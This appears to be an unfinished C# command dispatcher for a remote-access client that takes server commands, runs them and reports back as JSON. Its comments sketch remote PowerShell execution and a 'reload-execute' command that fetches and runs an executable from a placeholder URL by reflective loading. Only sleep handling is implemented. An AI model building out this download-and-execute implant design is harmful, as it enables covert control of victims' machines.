//import ALL the tools... yay


/*
 * Ryan Documentation note:
 * Each case value will take the parsed command, run it, and based on the output, pack a json string. that json string gets returned, 
 * then send back to the server
 * 
 * 
 * 
 */

namespace Client.Logic
{

    class Trees
    {
        //interal, would rather not have anyone poking around at this lol
        //DocuNotes: Takes the MyJsonStruct type, which is just the data type defined in Comms.JsonHandler.
        internal static string decisionTree(JsonStruct.MyJsonStruct command)
        {
            //need to:
            /*
             * Split command into parts (delim on spaces or something?
             * Take first item, which is the command part, and use that for the command
             * Pass whatever else is needed to the respectvve tool/action?
             * 
             * Might be best to leave the arguemnt splitting to each case statemetn if needed.
             * 
             * ex: run-ps-command whoami ->
             *      command: run-ps-command
             *      command arg: whoami

             * ex: reload-execute http://safe.com/maliciouos.exe -recon ->
             *      command: reload-execute
             *      command arg: http://safe.com/maliciouos.exe -recon
             * 
            */
            //fill this in with placeholder JSON just in case the switch fails
            string jsonString = "";

            string parsedCommand = command.msg.msg_command;


            switch (parsedCommand)
            {
                case "":
                case "wait":
                case "sleep":
                    jsonString = Client.Comms.JsonHandler.ToJson(
                        CID: Client.PropertyHandler.Properties.ID,
                        msgValue: $"{parsedCommand} recieved, Client sleeping");

                    return jsonString;

                case "re-load":
                    //parse arguments (see above)...
                    //run reflective load...
                    //get results from refelctive load...
                    //pack into json & return


                default:
                    jsonString = Client.Comms.JsonHandler.ToJson(
                        CID: Client.PropertyHandler.Properties.ID,
                        msgValue: "No command recieved, Client sleeping");

                    return jsonString;
            } 


        }
    }
}